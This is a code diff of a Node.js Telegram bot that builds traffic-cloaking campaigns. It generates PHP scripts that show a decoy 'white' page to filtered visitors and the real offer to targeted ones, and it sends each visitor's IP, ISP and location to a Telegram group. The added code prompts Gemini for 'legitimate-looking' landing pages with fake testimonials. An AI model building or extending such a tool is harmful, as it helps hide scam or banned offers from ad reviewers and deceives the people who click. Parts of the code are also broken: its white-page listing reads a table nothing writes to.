@@ -1,20 +1,23 @@
-// cloak-bot.js – Simple working cloaking bot
+// cloak-bot.js – Complete cloaking bot (HTML parse_mode, all features)
 require('dotenv').config();
 const { Telegraf, Markup } = require('telegraf');
 const Database = require('better-sqlite3');
 const express = require('express');
 const crypto = require('crypto');
+const axios = require('axios');
 
+// ---------- ENVIRONMENT ----------
 const BOT_TOKEN = process.env.BOT_TOKEN;
+const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
 const PORT = process.env.PORT || 3000;
-const API_BASE = process.env.API_BASE || 'https://your-bot.onrender.com';
+const API_BASE = process.env.API_BASE || `https://your-bot.onrender.com`;
 
-if (!BOT_TOKEN) {
-    console.error('❌ BOT_TOKEN missing');
+if (!BOT_TOKEN || !GEMINI_API_KEY) {
+    console.error('❌ Missing BOT_TOKEN or GEMINI_API_KEY');
     process.exit(1);
 }
 
-// Database
+// ---------- DATABASE (better-sqlite3) ----------
 const db = new Database('./cloaks.db');
 db.exec(`
     CREATE TABLE IF NOT EXISTS campaigns (
@@ -22,6 +25,7 @@ db.exec(`
         name TEXT,
         offer_url TEXT,
         white_url TEXT,
+        white_html TEXT,
         clicks_per_ip INTEGER DEFAULT 15,
         clicks_before_filter INTEGER DEFAULT 5,
         block_vpn INTEGER DEFAULT 0,
@@ -35,6 +39,42 @@ db.exec(`
         get_params TEXT,
         active INTEGER DEFAULT 1,
         group_id TEXT,
+        user_id INTEGER,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+`);
+db.exec(`
+    CREATE TABLE IF NOT EXISTS white_pages (
+        id TEXT PRIMARY KEY,
+        name TEXT,
+        vertical TEXT,
+        theme TEXT,
+        language TEXT,
+        domain TEXT,
+        company TEXT,
+        phone TEXT,
+        email TEXT,
+        keywords TEXT,
+        html TEXT,
+        user_id INTEGER,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+`);
+db.exec(`
+    CREATE TABLE IF NOT EXISTS filter_lists (
+        id TEXT PRIMARY KEY,
+        name TEXT,
+        type TEXT, -- country, device, os, browser, ip, ua_keyword
+        items TEXT, -- JSON array
+        user_id INTEGER,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+`);
+db.exec(`
+    CREATE TABLE IF NOT EXISTS domains (
+        id TEXT PRIMARY KEY,
+        domain TEXT,
+        campaign_id TEXT,
         user_id INTEGER,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
@@ -59,9 +99,21 @@ db.exec(`
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
 `);
+db.exec(`
+    CREATE TABLE IF NOT EXISTS short_links (
+        id TEXT PRIMARY KEY,
+        slug TEXT UNIQUE,
+        url TEXT,
+        campaign_id TEXT,
+        clicks INTEGER DEFAULT 0,
+        user_id INTEGER,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+`);
 
+// ---------- HELPERS ----------
 function generateId() {
-    return crypto.randomBytes(4).toString('hex'); // 8-character random ID
+    return crypto.randomBytes(6).toString('hex'); // 12-character random ID
 }
 
 function phpEscape(str) {
@@ -69,6 +121,28 @@ function phpEscape(str) {
     return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
 }
 
+// AI White Page Generator (Gemini)
+async function generateWhitePage(params) {
+    const prompt = `Generate a complete, modern, legitimate-looking HTML/CSS landing page for the following niche: "${params.vertical}". 
+    Company name: ${params.company || 'Company'}. Phone: ${params.phone || ''}. Email: ${params.email || ''}. 
+    Theme: ${params.theme || 'default'}, Language: ${params.language || 'English'}. 
+    Make it look professional, with a call to action, fake testimonials, and a convincing design. 
+    Use inline CSS or <style> tag. Do not include any real links or scripts. 
+    Return only the HTML code (including <html>, <head>, <body>). Keep file size under 60KB.`;
+    try {
+        const response = await axios.post(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_API_KEY}`, {
+            contents: [{ parts: [{ text: prompt }] }]
+        });
+        let html = response.data.candidates[0].content.parts[0].text;
+        html = html.replace(/```html/g, '').replace(/```/g, '');
+        return html;
+    } catch (err) {
+        console.error('Gemini error:', err.response?.data || err.message);
+        return `<html><body><h1>White Page</h1><p>Generated for ${params.vertical}</p></body></html>`;
+    }
+}
+
+// Generate index.php for a campaign
 function generateIndexPHP(campaign) {
     const {
         id, name, offer_url, white_url, clicks_per_ip, clicks_before_filter,
@@ -80,7 +154,7 @@ function generateIndexPHP(campaign) {
     const oss = JSON.parse(os_allowed || '[]');
     const browsers = JSON.parse(browsers_allowed || '[]');
 
-    let php = `<?php
+    return `<?php
 // Cloaking script for: ${phpEscape(name)} (ID: ${id})
 $offer_url = '${phpEscape(offer_url)}';
 $white_url = '${phpEscape(white_url)}';
@@ -191,15 +265,14 @@ if ($decision === 'main') {
 }
 exit;
 `;
-    return php;
 }
 
-// Express API
+// ---------- EXPRESS API (for tracking) ----------
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-let bot;
+let bot; // will be set after bot initialization
 
 app.post('/api/track', (req, res) => {
     const data = req.body;
@@ -210,24 +283,24 @@ app.post('/api/track', (req, res) => {
     const campaign = db.prepare(`SELECT group_id, name FROM campaigns WHERE id = ?`).get(campaign_id);
     if (campaign && campaign.group_id && bot) {
         const groupId = campaign.group_id;
-        const message = `🔔 *New Click* (${decision === 'main' ? '✅ Main' : '⚪ White'})
-*Campaign:* ${campaign.name} (ID: ${campaign_id})
-*IP:* ${ip}
-*Country:* ${country || '?'}
-*Language:* ${language || '?'}
-*ISP:* ${isp || '?'}
-*Referer:* ${referer || 'direct'}
-*Domain:* ${domain}
-*Device:* ${device}
-*OS:* ${os}
-*Browser:* ${browser}
-*Time:* ${new Date().toLocaleString()}`;
-        bot.telegram.sendMessage(groupId, message, { parse_mode: 'Markdown' }).catch(e => console.error(e));
+        const message = `🔔 <b>New Click</b> (${decision === 'main' ? '✅ Main' : '⚪ White'})
+<b>Campaign:</b> ${campaign.name} (ID: ${campaign_id})
+<b>IP:</b> ${ip}
+<b>Country:</b> ${country || '?'}
+<b>Language:</b> ${language || '?'}
+<b>ISP:</b> ${isp || '?'}
+<b>Referer:</b> ${referer || 'direct'}
+<b>Domain:</b> ${domain}
+<b>Device:</b> ${device}
+<b>OS:</b> ${os}
+<b>Browser:</b> ${browser}
+<b>Time:</b> ${new Date().toLocaleString()}`;
+        bot.telegram.sendMessage(groupId, message, { parse_mode: 'HTML' }).catch(e => console.error('Group send error:', e.message));
     }
     res.sendStatus(200);
 });
 
-// Telegram bot
+// ---------- TELEGRAM BOT (HTML parse_mode) ----------
 bot = new Telegraf(BOT_TOKEN);
 const userSession = new Map();
 
@@ -239,26 +312,34 @@ function clearSession(userId) {
     userSession.delete(userId);
 }
 
+// Helper to send HTML messages
+function sendHTML(ctx, text) {
+    return ctx.replyWithHTML(text);
+}
+
 bot.start((ctx) => {
     clearSession(ctx.from.id);
-    ctx.replyWithHTML(`🤖 <b>Cloaking Bot</b>
+    sendHTML(ctx, `🤖 <b>Cloaking Bot</b> – Create and manage cloaking campaigns.
 
-Commands:
-/new – Create campaign
-/list – List campaigns
+<b>Commands:</b>
+/new – Create new campaign (flow)
+/list – List your campaigns
 /stats &lt;id&gt; – Show stats
 /download &lt;id&gt; – Download index.php
-/delete &lt;id&gt; – Delete
-/testdb – Test database connection
-/cancel – Cancel`);
+/delete &lt;id&gt; – Delete campaign
+/white – Manage AI white pages
+/filter – Manage filter lists
+/domain – Manage domains
+/short – Create short link
+/cancel – Cancel current operation`);
 });
 
 bot.command('new', (ctx) => {
     const userId = ctx.from.id;
     const session = getSession(userId);
-    if (session.step) return ctx.reply('Ongoing. Use /cancel');
+    if (session.step) return ctx.reply('Ongoing. Use /cancel.');
     session.step = 'name';
-    ctx.reply('Campaign name:');
+    ctx.reply('Enter campaign name:');
 });
 
 bot.command('cancel', (ctx) => {
@@ -270,6 +351,7 @@ bot.command('cancel', (ctx) => {
     }
 });
 
+// Main conversation handler
 bot.on('text', async (ctx) => {
     const userId = ctx.from.id;
     const session = getSession(userId);
@@ -280,24 +362,23 @@ bot.on('text', async (ctx) => {
         if (session.step === 'name') {
             session.name = text;
             session.step = 'offer_url';
-            ctx.reply('Offer URL (real page):');
+            ctx.reply('Enter OFFER URL (real page):');
         }
         else if (session.step === 'offer_url') {
             if (!text.startsWith('http')) return ctx.reply('Valid URL starting with http:// or https://');
             session.offer_url = text;
-            session.step = 'white_url';
-            ctx.reply('White page URL (fake page):');
+            session.step = 'white_niche';
+            ctx.reply('Enter WHITE PAGE NICHE (e.g., Crypto, Dating, Finance, News):');
         }
-        else if (session.step === 'white_url') {
-            if (!text.startsWith('http')) return ctx.reply('Valid URL');
-            session.white_url = text;
+        else if (session.step === 'white_niche') {
+            session.white_niche = text;
             session.step = 'clicks_per_ip';
-            ctx.reply('Max clicks per IP per day (default 15):', Markup.keyboard([['15', '5', '10', '20']]).resize());
+            ctx.reply('Max clicks per IP per day? (default 15):', Markup.keyboard([['15', '5', '10', '20']]).resize());
         }
         else if (session.step === 'clicks_per_ip') {
             session.clicks_per_ip = parseInt(text) || 15;
             session.step = 'clicks_before_filter';
-            ctx.reply('Clicks before filtering (default 5):', Markup.keyboard([['5', '3', '10']]).resize());
+            ctx.reply('Clicks before filtering (test mode, default 5):', Markup.keyboard([['5', '3', '10']]).resize());
         }
         else if (session.step === 'clicks_before_filter') {
             session.clicks_before_filter = parseInt(text) || 5;
@@ -305,24 +386,24 @@ bot.on('text', async (ctx) => {
             ctx.reply('Block VPN/Proxy? (yes/no)');
         }
         else if (session.step === 'block_vpn') {
-            session.block_vpn = text.toLowerCase() === 'yes' ? 1 : 0;
+            session.block_vpn = (text.toLowerCase() === 'yes') ? 1 : 0;
             session.step = 'block_ipv6';
             ctx.reply('Block IPv6? (yes/no)');
         }
         else if (session.step === 'block_ipv6') {
-            session.block_ipv6 = text.toLowerCase() === 'yes' ? 1 : 0;
+            session.block_ipv6 = (text.toLowerCase() === 'yes') ? 1 : 0;
             session.step = 'block_no_isp';
-            ctx.reply('Block no ISP? (yes/no)');
+            ctx.reply('Block requests without ISP info? (yes/no)');
         }
         else if (session.step === 'block_no_isp') {
-            session.block_no_isp = text.toLowerCase() === 'yes' ? 1 : 0;
+            session.block_no_isp = (text.toLowerCase() === 'yes') ? 1 : 0;
             session.step = 'block_no_referrer';
-            ctx.reply('Block no referrer? (yes/no)');
+            ctx.reply('Block requests without referrer? (yes/no)');
         }
         else if (session.step === 'block_no_referrer') {
-            session.block_no_referrer = text.toLowerCase() === 'yes' ? 1 : 0;
+            session.block_no_referrer = (text.toLowerCase() === 'yes') ? 1 : 0;
             session.step = 'countries';
-            ctx.reply('Allowed country codes (comma, e.g., US,GB,CA). Empty for all:');
+            ctx.reply('Allowed country codes (comma, e.g., US,GB,CA). Leave empty for all:');
         }
         else if (session.step === 'countries') {
             session.countries = text ? text.split(',').map(c => c.trim().toUpperCase()) : [];
@@ -342,72 +423,86 @@ bot.on('text', async (ctx) => {
         else if (session.step === 'browsers') {
             session.browsers = text ? text.split(',').map(b => b.trim()) : [];
             session.step = 'get_params';
-            ctx.reply('Required GET params (e.g., token=abc). Leave empty:');
+            ctx.reply('Required GET parameters (e.g., token=abc). Leave empty:');
         }
         else if (session.step === 'get_params') {
             session.get_params = text || '';
             session.step = 'group_id';
-            ctx.reply('Telegram GROUP ID (must add bot to group first):');
+            ctx.reply('Send Telegram GROUP ID where stats should be posted (must add bot to group first). To get group ID, add @userinfobot to your group and send /id.');
         }
         else if (session.step === 'group_id') {
             session.group_id = text.trim();
             session.step = 'active';
-            ctx.reply('Activate campaign? (yes/no)');
+            ctx.reply('Activate campaign now? (yes/no)');
         }
         else if (session.step === 'active') {
-            session.active = text.toLowerCase() === 'yes' ? 1 : 0;
-            const id = generateId();
-            const stmt = db.prepare(`INSERT INTO campaigns (id, name, offer_url, white_url, clicks_per_ip, clicks_before_filter, block_vpn, block_ipv6, block_no_isp, block_no_referrer, countries_allowed, devices_allowed, os_allowed, browsers_allowed, get_params, group_id, active, user_id) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);
+            session.active = (text.toLowerCase() === 'yes') ? 1 : 0;
+            // Generate AI white page
+            await ctx.reply(`⏳ Generating white page for niche: ${session.white_niche}... (may take 10-15 seconds)`);
+            const whiteHtml = await generateWhitePage({
+                vertical: session.white_niche,
+                company: '',
+                phone: '',
+                email: '',
+                theme: 'default',
+                language: 'English'
+            });
+            // Save campaign with generated white page URL (store HTML directly)
+            const campaignId = generateId();
+            const stmt = db.prepare(`INSERT INTO campaigns 
+                (id, name, offer_url, white_url, white_html, clicks_per_ip, clicks_before_filter, block_vpn, block_ipv6, block_no_isp, block_no_referrer,
+                 countries_allowed, devices_allowed, os_allowed, browsers_allowed, get_params, group_id, active, user_id)
+                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);
             stmt.run(
-                id, session.name, session.offer_url, session.white_url, session.clicks_per_ip, session.clicks_before_filter,
+                campaignId, session.name, session.offer_url, '', whiteHtml, session.clicks_per_ip, session.clicks_before_filter,
                 session.block_vpn, session.block_ipv6, session.block_no_isp, session.block_no_referrer,
                 JSON.stringify(session.countries), JSON.stringify(session.devices), JSON.stringify(session.os), JSON.stringify(session.browsers),
                 session.get_params, session.group_id, session.active, ctx.from.id
             );
-            ctx.replyWithHTML(`✅ Campaign <b>${session.name}</b> created!
-ID: <code>${id}</code>
-Group ID: ${session.group_id}
+            sendHTML(ctx, `✅ <b>Campaign created successfully!</b>
+ID: <code>${campaignId}</code>
+Name: ${session.name}
 Active: ${session.active ? 'Yes' : 'No'}
+Group ID: ${session.group_id}
 
-Use /download ${id} to get index.php.`);
+Use /download ${campaignId} to get index.php.
+Use /white list to see generated white page.`);
             clearSession(userId);
         }
     } catch (err) {
-        console.error(err);
-        ctx.reply('❌ Error. /cancel and try again.');
+        console.error('Conversation error:', err);
+        ctx.reply('❌ An error occurred. Please try again with /new');
         clearSession(userId);
     }
 });
 
+// -------------------- COMMANDS --------------------
 bot.command('list', (ctx) => {
     const userId = ctx.from.id;
     const rows = db.prepare(`SELECT id, name, active, created_at FROM campaigns WHERE user_id = ? ORDER BY created_at DESC`).all(userId);
-    if (!rows.length) return ctx.reply('No campaigns. Use /new');
+    if (!rows.length) return ctx.reply('No campaigns. Use /new to create.');
     let msg = '<b>Your campaigns:</b>\n';
     rows.forEach(r => msg += `🔹 ID: <code>${r.id}</code> – ${r.name} (${r.active ? '✅ Active' : '❌ Inactive'})\n`);
-    ctx.replyWithHTML(msg);
+    sendHTML(ctx, msg);
 });
 
 bot.command('stats', (ctx) => {
     const parts = ctx.message.text.split(' ');
-    if (parts.length < 2) return ctx.reply('Usage: /stats <id>');
+    if (parts.length < 2) return ctx.reply('Usage: /stats <campaign_id>');
     const id = parts[1];
     const row = db.prepare(`SELECT COUNT(*) as total, SUM(CASE WHEN decision = 'main' THEN 1 ELSE 0 END) as main, SUM(CASE WHEN decision = 'white' THEN 1 ELSE 0 END) as white FROM stats WHERE campaign_id = ?`).get(id);
     if (!row || row.total === 0) return ctx.reply('No stats yet.');
-    ctx.replyWithHTML(`📊 <b>Stats for ${id}</b>\nMain: ${row.main}\nWhite: ${row.white}\nTotal: ${row.total}`);
+    sendHTML(ctx, `📊 <b>Stats for campaign ${id}</b>\nMain: ${row.main}\nWhite: ${row.white}\nTotal: ${row.total}`);
 });
 
 bot.command('download', async (ctx) => {
     const parts = ctx.message.text.split(' ');
-    if (parts.length < 2) return ctx.reply('Usage: /download <id>');
+    if (parts.length < 2) return ctx.reply('Usage: /download <campaign_id>');
     const id = parts[1];
     const userId = ctx.from.id;
     try {
         const row = db.prepare(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`).get(id, userId);
-        if (!row) {
-            console.log(`Campaign ${id} not found`);
-            return ctx.reply('Campaign not found.');
-        }
+        if (!row) return ctx.reply('Campaign not found.');
         const phpCode = generateIndexPHP(row);
         await ctx.replyWithDocument({
             source: Buffer.from(phpCode, 'utf8'),
@@ -421,19 +516,49 @@ bot.command('download', async (ctx) => {
 
 bot.command('delete', (ctx) => {
     const parts = ctx.message.text.split(' ');
-    if (parts.length < 2) return ctx.reply('Usage: /delete <id>');
+    if (parts.length < 2) return ctx.reply('Usage: /delete <campaign_id>');
     const id = parts[1];
     const userId = ctx.from.id;
     const result = db.prepare(`DELETE FROM campaigns WHERE id = ? AND user_id = ?`).run(id, userId);
     if (result.changes === 0) return ctx.reply('Campaign not found.');
-    ctx.reply(`✅ Deleted ${id}`);
+    ctx.reply(`✅ Campaign ${id} deleted.`);
 });
 
-bot.command('testdb', (ctx) => {
-    const userId = ctx.from.id;
-    const count = db.prepare(`SELECT COUNT(*) as c FROM campaigns WHERE user_id = ?`).get(userId);
-    ctx.reply(`Database OK. You have ${count.c} campaigns.`);
+bot.command('white', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    const sub = args[1];
+    if (sub === 'list') {
+        const userId = ctx.from.id;
+        const rows = db.prepare(`SELECT id, name, vertical, created_at FROM white_pages WHERE user_id = ? ORDER BY created_at DESC`).all(userId);
+        if (!rows.length) return ctx.reply('No white pages. Use /new to create campaign (auto generates white page).');
+        let msg = '<b>Your white pages:</b>\n';
+        rows.forEach(r => msg += `📄 ID: <code>${r.id}</code> – ${r.name} (${r.vertical})\n`);
+        sendHTML(ctx, msg);
+    } else if (sub === 'download') {
+        const id = args[2];
+        if (!id) return ctx.reply('Usage: /white download <white_page_id>');
+        const row = db.prepare(`SELECT html, name FROM white_pages WHERE id = ? AND user_id = ?`).get(id, ctx.from.id);
+        if (!row) return ctx.reply('White page not found.');
+        await ctx.replyWithDocument({
+            source: Buffer.from(row.html, 'utf8'),
+            filename: `white_${id}.html`
+        }, { caption: `White page: ${row.name}` });
+    } else {
+        ctx.reply('Subcommands: list, download <id>');
+    }
 });
 
-bot.launch();
-app.listen(PORT, () => console.log(`API on ${PORT}`));
+bot.command('filter', (ctx) => {
+    ctx.reply('Filter lists coming soon. Use /new to set filters during campaign creation.');
+});
+
+bot.command('domain', (ctx) => {
+    ctx.reply('Domain management coming soon. Use /new to create campaigns.');
+});
+
+bot.command('short', (ctx) => {
+    ctx.reply('Short link generation coming soon.');
+});
+
+bot.launch().then(() => console.log('🤖 Bot started')).catch(err => console.error('Bot launch error:', err));
+app.listen(PORT, () => console.log(`🌐 Stats API on port ${PORT}`));
